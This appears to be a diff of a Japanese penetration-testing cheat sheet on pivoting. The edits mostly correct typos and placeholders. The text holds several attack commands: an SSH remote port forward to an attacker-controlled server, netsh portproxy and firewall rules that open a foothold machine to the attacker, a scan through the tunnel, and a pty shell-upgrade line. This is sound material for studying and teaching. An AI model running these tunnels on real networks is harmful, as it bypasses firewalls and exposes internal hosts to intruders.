@@ -228,7 +228,7 @@ python3 -c 'import pty; pty.spawn("/bin/sh")'
 
 3. SSHクライアント上でリモートポートフォワーディング（出力はなし）
 ```zsh
-ssh -N -R 127.0.0.1:<SSH_server_listen_port>:<target_IP>:<port><SSH_server_username(Attacker)>@<SSH_server_IP>
+ssh -N -R 127.0.0.1:<SSH_server_listen_port>:<target_IP>:<port> <SSH_server_username(Attacker)>@<SSH_server_IP>
 ```
 
 4. 攻撃者のマシンでリモートポートフォワーディングが成功しているかどうかを確認
@@ -357,7 +357,7 @@ smbclient -L //<target_IP>/ -U <username> --password=<password>
 
 ---
 
-# WindowsツールによるPort Forwaring
+# WindowsツールによるPort Forwarding
 
 ## ssh.exe
 
@@ -383,7 +383,7 @@ Application     ssh.exe 8.1.0.1    C:\Windows\System32\OpenSSH\ssh.exe
 
 3. あとは[SSH Remote Dynamic Port Forwarding](#SSH%20Remote%20Dynamic%20Port%20Forwarding)のステップ３以降と同じ(`ssh -N...`)
 
-## 🔗[Plink](https://github.com/chrchang/plink-ng)
+## 🔗[Plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
 
 - ssh.exeが使えない場合や、インタラクティブなシェルが使えないとき(WinRM接続中など）に使用を検討
 - 条件：足場のマシンへのCLIアクセスが可能なとき使用可能
@@ -435,7 +435,7 @@ netsh interface portproxy add v4tov4 listenport=<Netsh_client_listen_port> liste
 
 2. 攻撃者のマシンから足場のマシンへの通信がFWで遮断される場合は、netshでFWを操作し、リッスンポートへの通信を許可する（成功時はOk.と出力される）
 ```powershell
-netsh advfirewall firewall add rule name="<rule_name>" protocol=TCP dir=in localip=<Netsh_client_IP> localport=<connect_port> action=allow
+netsh advfirewall firewall add rule name="<rule_name>" protocol=TCP dir=in localip=<Netsh_client_IP> localport=<Netsh_client_listen_port> action=allow
 ```
 
 3. 攻撃者のマシンからNmap等でリッスンポート経由でtargetのソケットにアクセス
@@ -447,9 +447,10 @@ sudo nmap -sS <Netsh_client_IP> -Pn -n -p <connect_port>
 4. netshによる変更の取り消し
 ```powershell
 # FWルールの削除
-netsh advfirewall firewall delete rule name="[rule_name>"
+netsh advfirewall firewall delete rule name="<rule_name>"
+
 # ポートフォワーディングの削除
-netsh interface portproxy del v4tov4 listenport=[指定したリッスンポート] listenaddress=[NetshクライアントIP]
+netsh interface portproxy del v4tov4 listenport=<Netsh_client_listen_port> listenaddress=<Netsh_client_IP>
 ```
 
 ---
